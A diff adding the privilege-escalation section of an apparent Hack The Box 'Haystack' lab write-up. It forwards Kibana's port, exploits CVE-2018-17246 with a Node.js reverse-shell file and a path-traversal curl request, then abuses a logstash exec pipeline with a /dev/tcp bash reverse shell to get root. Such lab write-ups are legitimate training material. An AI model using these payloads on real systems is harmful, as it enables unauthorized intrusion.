@@ -92,3 +92,154 @@ Last login: Fri Feb 18 12:03:21 2022 from 10.10.14.24
 ```
 
 ## Root
+Once we log in, following our standard approach, we can run linPEAS looking for possible privilege escalation vectors.    
+After we run linPEAS we can notice that a java process (logstash) is running as root:
+```
+╔══════════╣ Cleaned processes                                                                                                                                                                                                               
+╚ Check weird & unexpected proceses run by root: https://book.hacktricks.xyz/linux-unix/privilege-escalation#processes                                                                                                                       
+root          1  0.0  0.1 128028  6572 ?        Ss   10:58   0:05 /usr/lib/systemd/systemd --switched-root --system --deserialize 22                                                                                                         
+root       3086  0.0  0.1  40232  4444 ?        Ss   10:58   0:01 /usr/lib/systemd/systemd-journald                                                                                                                                          
+root       3103  0.0  0.2 127348  7956 ?        Ss   10:58   0:00 /usr/sbin/lvmetad -f                                                                                                                                                       
+root       3116  0.0  0.1  48076  5560 ?        Ss   10:58   0:01 /usr/lib/systemd/systemd-udevd                                                                                                                                             
+root       6233  0.0  0.0  62044  1088 ?        S<sl 10:59   0:00 /sbin/auditd                                                                                                                                                               
+root       6390  0.0  0.0  26376  1756 ?        Ss   10:59   0:00 /usr/lib/systemd/systemd-logind                                                                                                                                            
+kibana     6391  0.4  5.4 1349780 212204 ?      Ssl  10:59   1:58 /usr/share/kibana/bin/../node/bin/node --no-warnings /usr/share/kibana/bin/../src/cli -c /etc/kibana/kibana.yml                                                                                                                                                                              
+root       6392  0.8 12.5 2724036 483456 ?      SNsl 10:59   4:08 /bin/java -Xms500m -Xmx500m -XX:+UseParNewGC -XX:+UseConcMarkSweepGC -XX:CMSInitiatingOccupancyFraction=75 -XX:+UseCMSInitiatingOccupancyOnly -Djava.awt.headless=true -Dfi
+le.encoding=UTF-8 -Djruby.compile.invokedynamic=true -Djruby.jit.threshold=0 -XX:+HeapDumpOnOutOfMemoryError -Djava.security.egd=file:/dev/urandom -cp /usr/share/logstash/logstash-core/lib/jars/animal-sniffer-annotations-1.14.jar:/usr/sh
+are/logstash/logstash-core/lib/jars/commons-codec-1.11.jar:/usr/share/logstash/logstash-core/lib/jars/commons-compiler-3.0.8.jar:/usr/share/logstash/logstash-core/lib/jars/error_prone_annotations-2.0.18.jar:/usr/share/logstash/logstash-c
+ore/lib/jars/google-java-format-1.1.jar:/usr/share/logstash/logstash-core/lib/jars/gradle-license-report-0.7.1.jar:/usr/share/logstash/logstash-core/lib/jars/guava-22.0.jar:/usr/share/logstash/logstash-core/lib/jars/j2objc-annotations-1.
+1.jar:/usr/share/logstash/logstash-core/lib/jars/jackson-annotations-2.9.5.jar:/usr/share/logstash/logstash-core/lib/jars/jackson-core-2.9.5.jar:/usr/share/logstash/logstash-core/lib/jars/jackson-databind-2.9.5.jar:/usr/share/logstash/lo
+gstash-core/lib/jars/jackson-dataformat-cbor-2.9.5.jar:/usr/share/logstash/logstash-core/lib/jars/janino-3.0.8.jar:/usr/share/logstash/logstash-core/lib/jars/jruby-complete-9.1.13.0.jar:/usr/share/logstash/logstash-core/lib/jars/jsr305-1
+.3.9.jar:/usr/share/logstash/logstash-core/lib/jars/log4j-api-2.9.1.jar:/usr/share/logstash/logstash-core/lib/jars/log4j-core-2.9.1.jar:/usr/share/logstash/logstash-core/lib/jars/log4j-slf4j-impl-2.9.1.jar:/usr/share/logstash/logstash-co
+re/lib/jars/logstash-core.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.core.commands-3.6.0.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.core.contenttype-3.4.100.jar:/usr/share/logstash/logstash-core/lib/jars/o
+rg.eclipse.core.expressions-3.4.300.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.core.filesystem-1.3.100.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.core.jobs-3.5.100.jar:/usr/share/logstash/logstash-core/lib
+/jars/org.eclipse.core.resources-3.7.100.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.core.runtime-3.7.0.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.equinox.app-1.3.100.jar:/usr/share/logstash/logstash-core/l
+ib/jars/org.eclipse.equinox.common-3.6.0.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.equinox.preferences-3.4.1.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.equinox.registry-3.5.101.jar:/usr/share/logstash/log
+stash-core/lib/jars/org.eclipse.jdt.core-3.10.0.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.osgi-3.7.1.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.text-3.5.101.jar:/usr/share/logstash/logstash-core/lib/jars/
+slf4j-api-1.7.25.jar org.logstash.Logstash --path.settings /etc/logstash       
+[... SNIP ...]
+```
+Let's look at logstash configuration files and see if we can edit something and trigger a root shell.  
+```
+[security@haystack logstash]$ ls -la
+total 52
+drwxr-xr-x.  3 root   root    183 Jun 18  2019 .
+drwxr-xr-x. 85 root   root   8192 Aug 27  2019 ..
+drwxrwxr-x.  2 root   kibana   62 Jun 24  2019 conf.d
+-rw-r--r--.  1 root   kibana 1850 Nov 28  2018 jvm.options
+-rw-r--r--.  1 root   kibana 4466 Sep 26  2018 log4j2.properties
+-rw-r--r--.  1 root   kibana  342 Sep 26  2018 logstash-sample.conf
+-rw-r--r--.  1 root   kibana 8192 Jan 23  2019 logstash.yml
+-rw-r--r--.  1 root   kibana 8164 Sep 26  2018 logstash.yml.rpmnew
+-rw-r--r--.  1 root   kibana  285 Sep 26  2018 pipelines.yml
+-rw-------.  1 kibana kibana 1725 Dec 10  2018 startup.options
+```
+as we can see all the logstash's configuration files are owned by root:kibana, especially the conf.d folder that may contain vulnerable user defined rules.  
+So if we want to have a chance to take a look at this conf we will need to pivot our access to kibana user and hopefully root.  
+As defined in [book.hacktricks.xyz for kibana](https://book.hacktricks.xyz/pentesting/5601-pentesting-kibana) there is an RCE vulnerability for kibana<6.6.0.  
+So let's check how to examine the kibana version.  
+According to [this source](https://kb.objectrocket.com/elasticsearch/how-to-check-your-elasticsearch-version-from-kibana) to enumerate kibana version, all we have to do is to perform a GET / request using kibana dev tools.  
+To access kibana dev tools we need to perform a local port forwarding.  
+We have two ways: use ```ssh -D 18567 -N -f security@$TARGET``` and use foxyproxy op port 18567. Or alternatively configure port forwarding with ```~C``` (this has to be the first character we type).
+```
+[security@haystack logstash]$
+ssh> -L 5602:127.0.0.1:5601
+Forwarding port.
+```
+And access kibana via our localhost on port 5602.
+Once we open kibana we can go to Dev Tolls and type ```GET /``` and in the response we will see the following:  
+```
+{
+  "name": "iQEYHgS",
+  "cluster_name": "elasticsearch",
+  "cluster_uuid": "pjrX7V_gSFmJY-DxP4tCQg",
+  "version": {
+    "number": "6.4.2",
+    "build_flavor": "default",
+    "build_type": "rpm",
+    "build_hash": "04711c2",
+    "build_date": "2018-09-26T13:34:09.098244Z",
+    "build_snapshot": false,
+    "lucene_version": "7.4.0",
+    "minimum_wire_compatibility_version": "5.6.0",
+    "minimum_index_compatibility_version": "5.0.0"
+  },
+  "tagline": "You Know, for Search"
+}
+```
+As we can se we are running version 6.4.2 so, there is a chance that kibana is vulnerable to RCE.
+Now, we can follow [this kibana vulnerability PoC](https://github.com/mpgn/CVE-2018-17246) and put the following file under /tmp/shell.sh
+```
+[security@haystack tmp]$ cat shell.js
+(function(){
+    var net = require("net"),
+        cp = require("child_process"),
+        sh = cp.spawn("/bin/sh", []);
+    var client = new net.Socket();
+    client.connect(1337, "10.10.14.24", function(){
+        client.pipe(sh.stdin);
+        sh.stdout.pipe(client);
+        sh.stderr.pipe(client);
+    });
+    return /a/; // Prevents the Node.js application form crashing
+})();
+```
+Then since this vulnerability exploit an LFI, we will need to call the following url using curl:
+```
+[security@haystack tmp]$ curl 'http://localhost:5601/api/console/api_server?sense_version=@@SENSE_VERSION&apis=../../../../../../.../../../../tmp/shell.js'
+```
+listen on port 1337, and we get a shell as kibana user
+```
+root@kali:~/Documents/HTB/Boxes/Haystack# nc -lvnp 1337
+listening on [any] 1337 ...
+connect to [10.10.14.24] from (UNKNOWN) [10.10.10.115] 54658
+id
+uid=994(kibana) gid=992(kibana) grupos=992(kibana) contexto=system_u:system_r:unconfined_service_t:s0
+```
+Now that we have kibana access rights, let's look straight into /etc/logstash/conf.d/ folder.  
+If we examine the files, we can see that the following pipeline is configured:  
+```
+bash-4.2$ cat *
+filter {
+        if [type] == "execute" {
+                grok {
+                        match => { "message" => "Ejecutar\s*comando\s*:\s+%{GREEDYDATA:comando}" }
+                }
+        }
+}
+input {
+        file {
+                path => "/opt/kibana/logstash_*"
+                start_position => "beginning"
+                sincedb_path => "/dev/null"
+                stat_interval => "10 second"
+                type => "execute"
+                mode => "read"
+        }
+}
+output {
+        if [type] == "execute" {
+                stdout { codec => json }
+                exec {
+                        command => "%{comando} &"
+                }
+        }
+}
+```
+so it seems like there is an input for logs and a filter that if matched, we can execute commands.  
+so now we can create a file containing the below:
+```
+Ejecutar comando : bash -i >& /dev/tcp/10.10.14.24/4444 0>&1
+```
+for matching the correct regex, as always, we cannot leave anything at the case, and we need to look at the elastic documentation for the meaning of the syntax of ```%{GREEDYDATA:comando}```.  
+essentially logstash is getting data from /opt/kibana/logstash_* and matching lines like ```Ejecutar comando : touch /tmp/helo``` putting into the variable comando the value of the data in the place where the regex is defined.  
+GREEDYDATA actually is grok syntax for *. more information can be found [here](https://logz.io/blog/logstash-grok/).  
+To check if we are matching the grok filter or not, we can use [this online tool](https://grokdebug.herokuapp.com/).
+now we can create a file, for example /opt/kibana/logstash_b0d put inside the above payload, and wait to get a root shell.  
+```
+root@kali:~/Documents/HTB/Boxes/Haystack# nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [10.10.14.24] from (UNKNOWN) [10.10.10.115] 47010
+bash: no hay control de trabajos en este shell
+[root@haystack /]# 
+```
